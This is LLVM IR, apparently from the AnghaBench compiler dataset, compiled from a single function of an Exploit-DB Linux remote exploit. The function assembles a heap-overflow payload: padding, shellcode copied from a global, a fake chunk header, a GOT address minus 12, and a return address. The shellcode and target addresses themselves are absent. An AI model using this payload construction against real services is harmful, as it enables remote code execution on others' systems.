; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23171.c_getbuf.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23171.c_getbuf.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [36 x i8] c"getbuf(): allocating memory failed.\00", align 1
@x86_exec = common dso_local global i32 0, align 4
@gotaddr = common dso_local global i32 0, align 4
@requestaddr = common dso_local global i64 0, align 8
@retoffset = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i8* @getbuf() #0 {
  %1 = alloca i8*, align 8
  %2 = call i64 @malloc(i32 1043)
  %3 = inttoptr i64 %2 to i8*
  store i8* %3, i8** %1, align 8
  %4 = icmp ne i8* %3, null
  br i1 %4, label %7, label %5

5:                                                ; preds = %0
  %6 = call i32 @printe(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str, i64 0, i64 0), i32 1)
  br label %7

7:                                                ; preds = %5, %0
  %8 = load i8*, i8** %1, align 8
  %9 = call i32 @memset(i8* %8, i32 120, i32 1024)
  %10 = load i8*, i8** %1, align 8
  %11 = getelementptr inbounds i8, i8* %10, i64 64
  %12 = load i32, i32* @x86_exec, align 4
  %13 = load i32, i32* @x86_exec, align 4
  %14 = call i32 @strlen(i32 %13)
  %15 = call i32 @memcpy(i8* %11, i32 %12, i32 %14)
  %16 = load i8*, i8** %1, align 8
  %17 = getelementptr inbounds i8, i8* %16, i64 1024
  %18 = bitcast i8* %17 to i64*
  store i64 4294967292, i64* %18, align 8
  %19 = load i8*, i8** %1, align 8
  %20 = getelementptr inbounds i8, i8* %19, i64 1028
  %21 = bitcast i8* %20 to i64*
  store i64 4294967295, i64* %21, align 8
  %22 = load i32, i32* @gotaddr, align 4
  %23 = sub nsw i32 %22, 12
  %24 = sext i32 %23 to i64
  %25 = load i8*, i8** %1, align 8
  %26 = getelementptr inbounds i8, i8* %25, i64 1032
  %27 = bitcast i8* %26 to i64*
  store i64 %24, i64* %27, align 8
  %28 = load i64, i64* @requestaddr, align 8
  %29 = load i64, i64* @retoffset, align 8
  %30 = add nsw i64 %28, %29
  %31 = load i8*, i8** %1, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1036
  %33 = bitcast i8* %32 to i64*
  store i64 %30, i64* %33, align 8
  %34 = load i8*, i8** %1, align 8
  %35 = getelementptr inbounds i8, i8* %34, i64 1040
  store i8 10, i8* %35, align 1
  %36 = load i8*, i8** %1, align 8
  %37 = getelementptr inbounds i8, i8* %36, i64 1041
  store i8 10, i8* %37, align 1
  %38 = load i8*, i8** %1, align 8
  ret i8* %38
}

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @printe(i8*, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i32, i32) #1

declare dso_local i32 @strlen(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
